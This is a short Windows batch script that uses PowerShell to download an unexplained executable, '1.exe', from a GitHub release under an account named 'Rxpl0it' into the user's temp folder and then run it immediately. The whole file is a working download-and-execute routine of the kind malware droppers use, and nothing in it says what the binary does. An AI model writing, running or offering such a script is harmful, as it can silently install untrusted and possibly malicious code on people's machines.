@echo off
set "URL=https://github.com/Rxpl0it/dwad/releases/download/wa/1.exe"
set "TEMP_DIR=%TEMP%"
set "EXE_NAME=1.exe"

echo Downloading %EXE_NAME%...
powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL%', '%TEMP_DIR%\%EXE_NAME%')"

if exist "%TEMP_DIR%\%EXE_NAME%" (
    echo Download complete. Executing %EXE_NAME%...
    start "" "%TEMP_DIR%\%EXE_NAME%"
) else (
    echo Failed to download %EXE_NAME%.
)

echo Script execution complete.
pause
